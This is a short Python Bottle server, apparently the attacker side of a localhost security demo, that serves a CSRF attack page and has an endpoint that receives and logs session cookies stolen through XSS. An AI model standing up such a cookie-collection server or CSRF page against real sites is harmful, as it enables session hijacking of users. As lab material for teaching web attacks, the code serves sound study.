from bottle import (
    get,
    request,
    run,
    TEMPLATE_PATH,
    jinja2_template as template,
)

TEMPLATE_PATH.insert(0, 'malicious_app/views/')

@get('/csrf')
def csrf_attack():
    return template('csrf')


# Usage: http://localhost:8081/xss_out?stolen_cookie=321
@get('/xss_out')
def receive_xss_output():
    session_id = request.query.get('stolen_cookie')
    print("Received session cookie: {}".format(session_id))
    return


def run_server():
    run(host='localhost', port=8081)

